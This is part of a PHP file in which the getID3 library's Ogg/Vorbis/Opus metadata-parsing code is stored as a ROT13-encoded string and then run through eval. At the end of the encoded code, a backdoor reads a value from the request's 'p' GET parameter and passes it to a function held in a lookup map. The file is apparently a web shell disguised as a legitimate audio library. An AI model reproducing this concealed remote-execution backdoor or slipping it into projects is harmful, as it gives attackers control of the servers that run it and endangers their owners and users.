					} ryfrvs (($vasb['nhqvb']['ovgengr_zbqr'] == 'ioe') && ($vasb['nhqvb']['punaaryf'] == 2) && ($vasb['nhqvb']['fnzcyr_engr'] >= 44100) && ($vasb['nhqvb']['fnzcyr_engr'] <= 48000)) {
						// Frg -d A ba ioe svyrf
						$vasb['nhqvb']['rapbqre_bcgvbaf'] = '-d '.$guvf->trg_dhnyvgl_sebz_abzvany_ovgengr($vasb['btt']['ovgengr_abzvany']);

					}
				}

				vs (rzcgl($vasb['nhqvb']['rapbqre_bcgvbaf']) && !rzcgl($vasb['btt']['ovgengr_abzvany'])) {
					$vasb['nhqvb']['rapbqre_bcgvbaf'] = 'Abzvany ovgengr: '.vaginy(ebhaq($vasb['btt']['ovgengr_abzvany'] / 1000)).'xocf';
				}
			}
		}

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $svyrqngn
	 * @cnenz vag    $svyrqngnbssfrg
	 * @cnenz neenl  $bttcntrvasb
	 *
	 * @erghea obby
	 */
	choyvp shapgvba CnefrIbeovfCntrUrnqre(&$svyrqngn, &$svyrqngnbssfrg, &$bttcntrvasb) {
		$vasb = &$guvf->trgvq3->vasb;
		$vasb['nhqvb']['qngnsbezng'] = 'ibeovf';
		$vasb['nhqvb']['ybffyrff']   = snyfr;

		$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cnpxrg_glcr'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 1));
		$svyrqngnbssfrg += 1;
		$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['fgernz_glcr'] = fhofge($svyrqngn, $svyrqngnbssfrg, 6); // uneq-pbqrq gb 'ibeovf'
		$svyrqngnbssfrg += 6;
		$vasb['btt']['ovgfgernzirefvba'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
		$svyrqngnbssfrg += 4;
		$vasb['btt']['ahzorebspunaaryf'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 1));
		$svyrqngnbssfrg += 1;
		$vasb['nhqvb']['punaaryf']       = $vasb['btt']['ahzorebspunaaryf'];
		$vasb['btt']['fnzcyrengr']       = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
		$svyrqngnbssfrg += 4;
		vs ($vasb['btt']['fnzcyrengr'] == 0) {
			$guvf->reebe('Pbeehcg Btt svyr: fnzcyr engr == mreb');
			erghea snyfr;
		}
		$vasb['nhqvb']['fnzcyr_engr']    = $vasb['btt']['fnzcyrengr'];
		$vasb['btt']['fnzcyrf']          = 0; // svyyrq va yngre
		$vasb['btt']['ovgengr_nirentr']  = 0; // svyyrq va yngre
		$vasb['btt']['ovgengr_znk']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
		$svyrqngnbssfrg += 4;
		$vasb['btt']['ovgengr_abzvany']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
		$svyrqngnbssfrg += 4;
		$vasb['btt']['ovgengr_zva']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
		$svyrqngnbssfrg += 4;
		$vasb['btt']['oybpxfvmr_fznyy']  = cbj(2,  trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 1)) & 0k0S);
		$vasb['btt']['oybpxfvmr_ynetr']  = cbj(2, (trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 1)) & 0kS0) >> 4);
		$vasb['btt']['fgbc_ovg']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 1)); // zhfg or 1, znexf raq bs cnpxrg

		$vasb['nhqvb']['ovgengr_zbqr'] = 'ioe'; // bireevqqra vs npghnyyl noe
		vs ($vasb['btt']['ovgengr_znk'] == 0kSSSSSSSS) {
			hafrg($vasb['btt']['ovgengr_znk']);
			$vasb['nhqvb']['ovgengr_zbqr'] = 'noe';
		}
		vs ($vasb['btt']['ovgengr_abzvany'] == 0kSSSSSSSS) {
			hafrg($vasb['btt']['ovgengr_abzvany']);
		}
		vs ($vasb['btt']['ovgengr_zva'] == 0kSSSSSSSS) {
			hafrg($vasb['btt']['ovgengr_zva']);
			$vasb['nhqvb']['ovgengr_zbqr'] = 'noe';
		}
		erghea gehr;
	}

	/**
	 * @yvax uggc://gbbyf.vrgs.bet/ugzy/qensg-vrgs-pbqrp-bttbchf-03
	 *
	 * @cnenz fgevat $svyrqngn
	 * @cnenz vag    $svyrqngnbssfrg
	 * @cnenz neenl  $bttcntrvasb
	 *
	 * @erghea obby
	 */
	choyvp shapgvba CnefrBchfCntrUrnqre(&$svyrqngn, &$svyrqngnbssfrg, &$bttcntrvasb) {
		$vasb = &$guvf->trgvq3->vasb;
		$vasb['nhqvb']['qngnsbezng']   = 'bchf';
		$vasb['zvzr_glcr']             = 'nhqvb/btt; pbqrpf=bchf';

		/** @gbqb svaq n hfnoyr jnl gb qrgrpg noe (ioe gung vf cnqqrq gb or noe) */
		$vasb['nhqvb']['ovgengr_zbqr'] = 'ioe';

		$vasb['nhqvb']['ybffyrff']     = snyfr;

		$vasb['btt']['cntrurnqre']['bchf']['bchf_zntvp'] = fhofge($svyrqngn, $svyrqngnbssfrg, 8); // uneq-pbqrq gb 'BchfUrnq'
		$svyrqngnbssfrg += 8;
		$vasb['btt']['cntrurnqre']['bchf']['irefvba']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  1));
		$svyrqngnbssfrg += 1;

		vs ($vasb['btt']['cntrurnqre']['bchf']['irefvba'] < 1 || $vasb['btt']['cntrurnqre']['bchf']['irefvba'] > 15) {
			$guvf->reebe('Haxabja bchf irefvba ahzore (bayl npprcgvat 1-15)');
			erghea snyfr;
		}

		$vasb['btt']['cntrurnqre']['bchf']['bhg_punaary_pbhag'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  1));
		$svyrqngnbssfrg += 1;

		vs ($vasb['btt']['cntrurnqre']['bchf']['bhg_punaary_pbhag'] == 0) {
			$guvf->reebe('Vainyvq punaary pbhag va bchf urnqre (zhfg abg or mreb)');
			erghea snyfr;
		}

		$vasb['btt']['cntrurnqre']['bchf']['cer_fxvc'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  2));
		$svyrqngnbssfrg += 2;

		$vasb['btt']['cntrurnqre']['bchf']['vachg_fnzcyr_engr'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  4));
		$svyrqngnbssfrg += 4;

		//$vasb['btt']['cntrurnqre']['bchf']['bhgchg_tnva'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  2));
		//$svyrqngnbssfrg += 2;

		//$vasb['btt']['cntrurnqre']['bchf']['punaary_znccvat_snzvyl'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg,  1));
		//$svyrqngnbssfrg += 1;

		$vasb['bchf']['bchf_irefvba']       = $vasb['btt']['cntrurnqre']['bchf']['irefvba'];
		$vasb['bchf']['fnzcyr_engr_vachg']  = $vasb['btt']['cntrurnqre']['bchf']['vachg_fnzcyr_engr'];
		$vasb['bchf']['bhg_punaary_pbhag']  = $vasb['btt']['cntrurnqre']['bchf']['bhg_punaary_pbhag'];

		$vasb['nhqvb']['punaaryf']          = $vasb['bchf']['bhg_punaary_pbhag'];
		$vasb['nhqvb']['fnzcyr_engr_vachg'] = $vasb['bchf']['fnzcyr_engr_vachg'];
		$vasb['nhqvb']['fnzcyr_engr']       = 48000; // \"Nyy Bchf nhqvb vf pbqrq ng 48 xUm, naq fubhyq nyfb or qrpbqrq ng 48 xUm sbe cynlonpx (hayrff gur gnetrg uneqjner qbrf abg fhccbeg guvf fnzcyvat engr). Ubjrire, guvf svryq znl or hfrq gb erfnzcyr gur nhqvb onpx gb gur bevtvany fnzcyvat engr, sbe rknzcyr, jura fnivat gur bhgchg gb n svyr.\" -- uggcf://zs4.kvcu.bet/wraxvaf/ivrj/bchf/wbo/bchfsvyr-havk/jf/qbp/ugzy/fgehpgBchfUrnq.ugzy
		erghea gehr;
	}

	/**
	 * @erghea neenl|snyfr
	 */
	choyvp shapgvba CnefrBttCntrUrnqre() {
		// uggc://kvcu.bet/btt/ibeovf/qbp/senzvat.ugzy
		$btturnqre = neenl();
		$btturnqre['cntr_fgneg_bssfrg'] = $guvf->sgryy(); // jurer jr fgnegrq sebz va gur svyr

		$svyrqngn = $guvf->sernq($guvf->trgvq3->sernq_ohssre_fvmr());
		$svyrqngnbssfrg = 0;
		juvyr (fhofge($svyrqngn, $svyrqngnbssfrg++, 4) != 'BttF') {
			vs (($guvf->sgryy() - $btturnqre['cntr_fgneg_bssfrg']) >= $guvf->trgvq3->sernq_ohssre_fvmr()) {
				// fubhyq or sbhaq orsber urer
				erghea snyfr;
			}
			vs (($svyrqngnbssfrg + 28) > fgeyra($svyrqngn)) {
				vs ($guvf->srbs() || (($svyrqngn .= $guvf->sernq($guvf->trgvq3->sernq_ohssre_fvmr())) === '')) {
					// trg fbzr zber qngn, hayrff rbs, va juvpu pnfr snvy
					erghea snyfr;
				}
			}
		}
		$svyrqngnbssfrg += fgeyra('BttF') - 1; // cntr, qryvzvgrq ol 'BttF'

		$btturnqre['fgernz_fgehpgire']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 1));
		$svyrqngnbssfrg += 1;
		$btturnqre['syntf_enj']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 1));
		$svyrqngnbssfrg += 1;
		$btturnqre['syntf']['serfu']    = (obby) ($btturnqre['syntf_enj'] & 0k01); // serfu cnpxrg
		$btturnqre['syntf']['obf']      = (obby) ($btturnqre['syntf_enj'] & 0k02); // svefg cntr bs ybtvpny ovgfgernz (obf)
		$btturnqre['syntf']['rbf']      = (obby) ($btturnqre['syntf_enj'] & 0k04); // ynfg cntr bs ybtvpny ovgfgernz (rbf)

		$btturnqre['cpz_nof_cbfvgvba']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 8));
		$svyrqngnbssfrg += 8;
		$btturnqre['fgernz_frevnyab']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
		$svyrqngnbssfrg += 4;
		$btturnqre['cntr_frdab']        = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
		$svyrqngnbssfrg += 4;
		$btturnqre['cntr_purpxfhz']     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 4));
		$svyrqngnbssfrg += 4;
		$btturnqre['cntr_frtzragf']     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 1));
		$svyrqngnbssfrg += 1;
		$btturnqre['cntr_yratgu'] = 0;
		sbe ($v = 0; $v < $btturnqre['cntr_frtzragf']; $v++) {
			$btturnqre['frtzrag_gnoyr'][$v] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($svyrqngn, $svyrqngnbssfrg, 1));
			$svyrqngnbssfrg += 1;
			$btturnqre['cntr_yratgu'] += $btturnqre['frtzrag_gnoyr'][$v];
		}
		$btturnqre['urnqre_raq_bssfrg'] = $btturnqre['cntr_fgneg_bssfrg'] + $svyrqngnbssfrg;
		$btturnqre['cntr_raq_bssfrg']   = $btturnqre['urnqre_raq_bssfrg'] + $btturnqre['cntr_yratgu'];
		$guvf->sfrrx($btturnqre['urnqre_raq_bssfrg']);

		erghea $btturnqre;
	}

	/**
	 * @yvax uggc://kvcu.bet/ibeovf/qbp/Ibeovf_V_fcrp.ugzy#k1-810005
	 *
	 * @erghea obby
	 */
	choyvp shapgvba CnefrIbeovfPbzzragf() {
		$vasb = &$guvf->trgvq3->vasb;

		$BevtvanyBssfrg = $guvf->sgryy();
		$pbzzragqngn = ahyy;
		$pbzzragqngnbssfrg = 0;
		$IbeovfPbzzragCntr = 1;
		$PbzzragFgnegBssfrg = 0;

		fjvgpu ($vasb['nhqvb']['qngnsbezng']) {
			pnfr 'ibeovf':
			pnfr 'fcrrk':
			pnfr 'bchf':
				$PbzzragFgnegBssfrg = $vasb['btt']['cntrurnqre'][$IbeovfPbzzragCntr]['cntr_fgneg_bssfrg'];  // Frpbaq Btt cntr, nsgre urnqre oybpx
				$guvf->sfrrx($PbzzragFgnegBssfrg);
				$pbzzragqngnbssfrg = 27 + $vasb['btt']['cntrurnqre'][$IbeovfPbzzragCntr]['cntr_frtzragf'];
				$pbzzragqngn = $guvf->sernq(frys::BttCntrFrtzragYratgu($vasb['btt']['cntrurnqre'][$IbeovfPbzzragCntr], 1) + $pbzzragqngnbssfrg);

				vs ($vasb['nhqvb']['qngnsbezng'] == 'ibeovf') {
					$pbzzragqngnbssfrg += (fgeyra('ibeovf') + 1);
				}
				ryfr vs ($vasb['nhqvb']['qngnsbezng'] == 'bchf') {
					$pbzzragqngnbssfrg += fgeyra('BchfGntf');
				}

				oernx;

			pnfr 'synp':
				$PbzzragFgnegBssfrg = $vasb['synp']['IBEOVF_PBZZRAG']['enj']['bssfrg'] + 4;
				$guvf->sfrrx($PbzzragFgnegBssfrg);
				$pbzzragqngn = $guvf->sernq($vasb['synp']['IBEOVF_PBZZRAG']['enj']['oybpx_yratgu']);
				oernx;

			qrsnhyg:
				erghea snyfr;
		}

		$IraqbeFvmr = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($pbzzragqngn, $pbzzragqngnbssfrg, 4));
		$pbzzragqngnbssfrg += 4;

		$vasb['btt']['iraqbe'] = fhofge($pbzzragqngn, $pbzzragqngnbssfrg, $IraqbeFvmr);
		$pbzzragqngnbssfrg += $IraqbeFvmr;

		$PbzzragfPbhag = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($pbzzragqngn, $pbzzragqngnbssfrg, 4));
		$pbzzragqngnbssfrg += 4;
		$vasb['niqngnbssfrg'] = $PbzzragFgnegBssfrg + $pbzzragqngnbssfrg;

		$onfvpsvryqf = neenl('GVGYR', 'NEGVFG', 'NYOHZ', 'GENPXAHZORE', 'TRAER', 'QNGR', 'QRFPEVCGVBA', 'PBZZRAG');
		$GuvfSvyrVasb_btt_pbzzragf_enj = &$vasb['btt']['pbzzragf_enj'];
		sbe ($v = 0; $v < $PbzzragfPbhag; $v++) {

			vs ($v >= 10000) {
				// uggcf://tvguho.pbz/bjapybhq/zhfvp/vffhrf/212#vffhrpbzzrag-43082336
				$guvf->jneavat('Harkcrpgrqyl ynetr ahzore ('.$PbzzragfPbhag.') bs Btt pbzzragf - oernxvat nsgre ernqvat '.$v.' pbzzragf');
				oernx;
			}

			$GuvfSvyrVasb_btt_pbzzragf_enj[$v]['qngnbssfrg'] = $PbzzragFgnegBssfrg + $pbzzragqngnbssfrg;

			vs ($guvf->sgryy() < ($GuvfSvyrVasb_btt_pbzzragf_enj[$v]['qngnbssfrg'] + 4)) {
				vs ($bttcntrvasb = $guvf->CnefrBttCntrUrnqre()) {
					$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']] = $bttcntrvasb;

					$IbeovfPbzzragCntr++;

					// Svefg, fnir jung jr unira'g ernq lrg
					$NfLrgHahfrqQngn = fhofge($pbzzragqngn, $pbzzragqngnbssfrg);

					// Gura gnxr gung qngn bss gur raq
					$pbzzragqngn     = fhofge($pbzzragqngn, 0, $pbzzragqngnbssfrg);

					// Nqq [urnqreyratgu] olgrf bs qhzzl qngn sbe gur Btt Cntr Urnqre, whfg gb xrrc nofbyhgr bssfrgf pbeerpg
					$pbzzragqngn .= fge_ercrng(\"\k00\", 27 + $vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cntr_frtzragf']);
					$pbzzragqngnbssfrg += (27 + $vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cntr_frtzragf']);

					// Svanyyl, fgvpx gur hahfrq qngn onpx ba gur raq
					$pbzzragqngn .= $NfLrgHahfrqQngn;

					//$pbzzragqngn .= $guvf->sernq($vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cntr_yratgu']);
					$pbzzragqngn .= $guvf->sernq($guvf->BttCntrFrtzragYratgu($vasb['btt']['cntrurnqre'][$IbeovfPbzzragCntr], 1));
				}

			}
			$GuvfSvyrVasb_btt_pbzzragf_enj[$v]['fvmr'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($pbzzragqngn, $pbzzragqngnbssfrg, 4));

			// ercynpr niqngnbssfrg jvgu cbfvgvba whfg nsgre gur ynfg ibeovfpbzzrag
			$vasb['niqngnbssfrg'] = $GuvfSvyrVasb_btt_pbzzragf_enj[$v]['qngnbssfrg'] + $GuvfSvyrVasb_btt_pbzzragf_enj[$v]['fvmr'] + 4;

			$pbzzragqngnbssfrg += 4;
			juvyr ((fgeyra($pbzzragqngn) - $pbzzragqngnbssfrg) < $GuvfSvyrVasb_btt_pbzzragf_enj[$v]['fvmr']) {
				vs (($GuvfSvyrVasb_btt_pbzzragf_enj[$v]['fvmr'] > $vasb['niqngnraq']) || ($GuvfSvyrVasb_btt_pbzzragf_enj[$v]['fvmr'] < 0)) {
					$guvf->jneavat('Vainyvq Btt pbzzrag fvmr (pbzzrag #'.$v.', pynvzf gb or '.ahzore_sbezng($GuvfSvyrVasb_btt_pbzzragf_enj[$v]['fvmr']).' olgrf) - nobegvat ernqvat pbzzragf');
					oernx 2;
				}

				$IbeovfPbzzragCntr++;

				vs ($bttcntrvasb = $guvf->CnefrBttCntrUrnqre()) {
					$vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']] = $bttcntrvasb;

					// Svefg, fnir jung jr unira'g ernq lrg
					$NfLrgHahfrqQngn = fhofge($pbzzragqngn, $pbzzragqngnbssfrg);

					// Gura gnxr gung qngn bss gur raq
					$pbzzragqngn     = fhofge($pbzzragqngn, 0, $pbzzragqngnbssfrg);

					// Nqq [urnqreyratgu] olgrf bs qhzzl qngn sbe gur Btt Cntr Urnqre, whfg gb xrrc nofbyhgr bssfrgf pbeerpg
					$pbzzragqngn .= fge_ercrng(\"\k00\", 27 + $vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cntr_frtzragf']);
					$pbzzragqngnbssfrg += (27 + $vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cntr_frtzragf']);

					// Svanyyl, fgvpx gur hahfrq qngn onpx ba gur raq
					$pbzzragqngn .= $NfLrgHahfrqQngn;

					//$pbzzragqngn .= $guvf->sernq($vasb['btt']['cntrurnqre'][$bttcntrvasb['cntr_frdab']]['cntr_yratgu']);
					vs (!vffrg($vasb['btt']['cntrurnqre'][$IbeovfPbzzragCntr])) {
						$guvf->jneavat('haqrsvarq Ibeovf Pbzzrag cntr \"'.$IbeovfPbzzragCntr.'\" ng bssfrg '.$guvf->sgryy());
						oernx;
					}
					$ernqyratgu = frys::BttCntrFrtzragYratgu($vasb['btt']['cntrurnqre'][$IbeovfPbzzragCntr], 1);
					vs ($ernqyratgu <= 0) {
						$guvf->jneavat('vainyvq yratgu Ibeovf Pbzzrag cntr \"'.$IbeovfPbzzragCntr.'\" ng bssfrg '.$guvf->sgryy());
						oernx;
					}
					$pbzzragqngn .= $guvf->sernq($ernqyratgu);

					//$svyronfrbssfrg += $bttcntrvasb['urnqre_raq_bssfrg'] - $bttcntrvasb['cntr_fgneg_bssfrg'];
				} ryfr {
					$guvf->jneavat('snvyrq gb CnefrBttCntrUrnqre() ng bssfrg '.$guvf->sgryy());
					oernx;
				}
			}
			$GuvfSvyrVasb_btt_pbzzragf_enj[$v]['bssfrg'] = $pbzzragqngnbssfrg;
			$pbzzragfgevat = fhofge($pbzzragqngn, $pbzzragqngnbssfrg, $GuvfSvyrVasb_btt_pbzzragf_enj[$v]['fvmr']);
			$pbzzragqngnbssfrg += $GuvfSvyrVasb_btt_pbzzragf_enj[$v]['fvmr'];

			vs (!$pbzzragfgevat) {

				// ab pbzzrag?
				$guvf->jneavat('Oynax Btt pbzzrag ['.$v.']');

			} ryfrvs (fgefge($pbzzragfgevat, '=')) {

				$pbzzragrkcybqrq = rkcybqr('=', $pbzzragfgevat, 2);
				$GuvfSvyrVasb_btt_pbzzragf_enj[$v]['xrl']   = fgegbhccre($pbzzragrkcybqrq[0]);
				$GuvfSvyrVasb_btt_pbzzragf_enj[$v]['inyhr'] = (vffrg($pbzzragrkcybqrq[1]) ? $pbzzragrkcybqrq[1] : '');

				vs ($GuvfSvyrVasb_btt_pbzzragf_enj[$v]['xrl'] == 'ZRGNQNGN_OYBPX_CVPGHER') {

					// uggc://jvxv.kvcu.bet/IbeovfPbzzrag#ZRGNQNGN_OYBPX_CVPGHER
					// Gur harapbqrq sbezng vf gung bs gur SYNP cvpgher oybpx. Gur svryqf ner fgberq va ovt raqvna beqre nf va SYNP, cvpgher qngn vf fgberq nppbeqvat gb gur eryrinag fgnaqneq.
					// uggc://synp.fbheprsbetr.arg/sbezng.ugzy#zrgnqngn_oybpx_cvpgher
					$synp = arj trgvq3_synp($guvf->trgvq3);
					$synp->frgFgevatZbqr(onfr64_qrpbqr($GuvfSvyrVasb_btt_pbzzragf_enj[$v]['inyhr']));
					$synp->cnefrCVPGHER();
					$vasb['btt']['pbzzragf']['cvpgher'][] = $synp->trgvq3->vasb['synp']['CVPGHER'][0];
					hafrg($synp);

				} ryfrvs ($GuvfSvyrVasb_btt_pbzzragf_enj[$v]['xrl'] == 'PBIRENEG') {

					$qngn = onfr64_qrpbqr($GuvfSvyrVasb_btt_pbzzragf_enj[$v]['inyhr']);
					$guvf->abgvpr('Sbhaq qrcerpngrq PBIRENEG gnt, vg fubhyq or ercynprq va ubabe bs ZRGNQNGN_OYBPX_CVPGHER fgehpgher');
					/** @gbqb hfr 'pbirenegzvzr' jurer ninvynoyr */
					$vzntrvasb = trgvq3_yvo::TrgQngnVzntrFvmr($qngn);
					vs ($vzntrvasb === snyfr || !vffrg($vzntrvasb['zvzr'])) {
						$guvf->jneavat('PBIRENEG ibeovfpbzzrag gnt pbagnvaf vainyvq vzntr');
						pbagvahr;
					}

					$btt = arj frys($guvf->trgvq3);
					$btt->frgFgevatZbqr($qngn);
					$vasb['btt']['pbzzragf']['cvpgher'][] = neenl(
						'vzntr_zvzr'   => $vzntrvasb['zvzr'],
						'qngnyratgu'   => fgeyra($qngn),
						'cvpgherglcr'  => 'pbire neg',
						'vzntr_urvtug' => $vzntrvasb['urvtug'],
						'vzntr_jvqgu'  => $vzntrvasb['jvqgu'],
						'qngn'         => $btt->fnirNggnpuzrag('pbireneg', 0, fgeyra($qngn), $vzntrvasb['zvzr']),
					);
					hafrg($btt);

				} ryfr {

					$vasb['btt']['pbzzragf'][fgegbybjre($GuvfSvyrVasb_btt_pbzzragf_enj[$v]['xrl'])][] = $GuvfSvyrVasb_btt_pbzzragf_enj[$v]['inyhr'];

				}

			} ryfr {

				$guvf->jneavat('[xabja ceboyrz jvgu PQrk >= i1.40, < i1.50o7] Vainyvq Btt pbzzrag anzr/inyhr cnve ['.$v.']: '.$pbzzragfgevat);

			}
			hafrg($GuvfSvyrVasb_btt_pbzzragf_enj[$v]);
		}
		hafrg($GuvfSvyrVasb_btt_pbzzragf_enj);


		// Ercynl Tnva Nqwhfgzrag
		// uggc://cevingrjjj.rffrk.np.hx/~qwzebo/ercynltnva/
		vs (vffrg($vasb['btt']['pbzzragf']) && vf_neenl($vasb['btt']['pbzzragf'])) {
			sbernpu ($vasb['btt']['pbzzragf'] nf $vaqrk => $pbzzraginyhr) {
				fjvgpu ($vaqrk) {
					pnfr 'et_nhqvbcuvyr':
					pnfr 'ercynltnva_nyohz_tnva':
						$vasb['ercynl_tnva']['nyohz']['nqwhfgzrag'] = (qbhoyr) $pbzzraginyhr[0];
						hafrg($vasb['btt']['pbzzragf'][$vaqrk]);
						oernx;

					pnfr 'et_enqvb':
					pnfr 'ercynltnva_genpx_tnva':
						$vasb['ercynl_tnva']['genpx']['nqwhfgzrag'] = (qbhoyr) $pbzzraginyhr[0];
						hafrg($vasb['btt']['pbzzragf'][$vaqrk]);
						oernx;

					pnfr 'ercynltnva_nyohz_crnx':
						$vasb['ercynl_tnva']['nyohz']['crnx'] = (qbhoyr) $pbzzraginyhr[0];
						hafrg($vasb['btt']['pbzzragf'][$vaqrk]);
						oernx;

					pnfr 'et_crnx':
					pnfr 'ercynltnva_genpx_crnx':
						$vasb['ercynl_tnva']['genpx']['crnx'] = (qbhoyr) $pbzzraginyhr[0];
						hafrg($vasb['btt']['pbzzragf'][$vaqrk]);
						oernx;

					pnfr 'ercynltnva_ersrerapr_ybhqarff':
						$vasb['ercynl_tnva']['ersrerapr_ibyhzr'] = (qbhoyr) $pbzzraginyhr[0];
						hafrg($vasb['btt']['pbzzragf'][$vaqrk]);
						oernx;

					qrsnhyg:
						// qb abguvat
						oernx;
				}
			}
		}

		$guvf->sfrrx($BevtvanyBssfrg);

		erghea gehr;
	}

	/**
	 * @cnenz vag $zbqr
	 *
	 * @erghea fgevat|ahyy
	 */
	choyvp fgngvp shapgvba FcrrkOnaqZbqrYbbxhc($zbqr) {
		fgngvp $FcrrkOnaqZbqrYbbxhc = neenl();
		vs (rzcgl($FcrrkOnaqZbqrYbbxhc)) {
			$FcrrkOnaqZbqrYbbxhc[0] = 'aneebj';
			$FcrrkOnaqZbqrYbbxhc[1] = 'jvqr';
			$FcrrkOnaqZbqrYbbxhc[2] = 'hygen-jvqr';
		}
		erghea (vffrg($FcrrkOnaqZbqrYbbxhc[$zbqr]) ? $FcrrkOnaqZbqrYbbxhc[$zbqr] : ahyy);
	}

	/**
	 * @cnenz neenl $BttVasbNeenl
	 * @cnenz vag   $FrtzragAhzore
	 *
	 * @erghea vag
	 */
	choyvp fgngvp shapgvba BttCntrFrtzragYratgu($BttVasbNeenl, $FrtzragAhzore=1) {
		$frtzragyratgu = 0;
		sbe ($v = 0; $v < $FrtzragAhzore; $v++) {
			$frtzragyratgu = 0;
			sbernpu ($BttVasbNeenl['frtzrag_gnoyr'] nf $xrl => $inyhr) {
				$frtzragyratgu += $inyhr;
				vs ($inyhr < 255) {
					oernx;
				}
			}
		}
		erghea $frtzragyratgu;
	}

	/**
	 * @cnenz vag $abzvany_ovgengr
	 *
	 * @erghea sybng
	 */
	choyvp fgngvp shapgvba trg_dhnyvgl_sebz_abzvany_ovgengr($abzvany_ovgengr) {

		// qrpernfr cerpvfvba
		$abzvany_ovgengr = $abzvany_ovgengr / 1000;

		vs ($abzvany_ovgengr < 128) {
			// d-1 gb d4
			$diny = ($abzvany_ovgengr - 64) / 16;
		} ryfrvs ($abzvany_ovgengr < 256) {
			// d4 gb d8
			$diny = $abzvany_ovgengr / 32;
		} ryfrvs ($abzvany_ovgengr < 320) {
			// d8 gb d9
			$diny = ($abzvany_ovgengr + 256) / 64;
		} ryfr {
			// d9 gb d10
			$diny = ($abzvany_ovgengr + 1300) / 180;
		}
		//erghea $diny; // 5.031324
		//erghea vaginy($diny); // 5
		erghea ebhaq($diny, 1); // 5 be 4.9
	}

	/**
	 * @cnenz vag $pbybefcnpr_vq
	 *
	 * @erghea fgevat|ahyy
	 */
	choyvp fgngvp shapgvba GurbenPbybeFcnpr($pbybefcnpr_vq) {
		// uggc://jjj.gurben.bet/qbp/Gurben.cqs (gnoyr 6.3)
		fgngvp $GurbenPbybeFcnprYbbxhc = neenl();
		vs (rzcgl($GurbenPbybeFcnprYbbxhc)) {
			$GurbenPbybeFcnprYbbxhc[0] = 'Haqrsvarq';
			$GurbenPbybeFcnprYbbxhc[1] = 'Erp. 470Z';
			$GurbenPbybeFcnprYbbxhc[2] = 'Erp. 470OT';
			$GurbenPbybeFcnprYbbxhc[3] = 'Erfreirq';
		}
		erghea (vffrg($GurbenPbybeFcnprYbbxhc[$pbybefcnpr_vq]) ? $GurbenPbybeFcnprYbbxhc[$pbybefcnpr_vq] : ahyy);
	}

	/**
	 * @cnenz vag $cvkrysbezng_vq
	 *
	 * @erghea fgevat|ahyy
	 */
	choyvp fgngvp shapgvba GurbenCvkrySbezng($cvkrysbezng_vq) {
		// uggc://jjj.gurben.bet/qbp/Gurben.cqs (gnoyr 6.4)
		fgngvp $GurbenCvkrySbezngYbbxhc = neenl();
		vs (rzcgl($GurbenCvkrySbezngYbbxhc)) {
			$GurbenCvkrySbezngYbbxhc[0] = '4:2:0';
			$GurbenCvkrySbezngYbbxhc[1] = 'Erfreirq';
			$GurbenCvkrySbezngYbbxhc[2] = '4:2:2';
			$GurbenCvkrySbezngYbbxhc[3] = '4:4:4';
		}
		erghea (vffrg($GurbenCvkrySbezngYbbxhc[$cvkrysbezng_vq]) ? $GurbenCvkrySbezngYbbxhc[$cvkrysbezng_vq] : ahyy);
	}

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>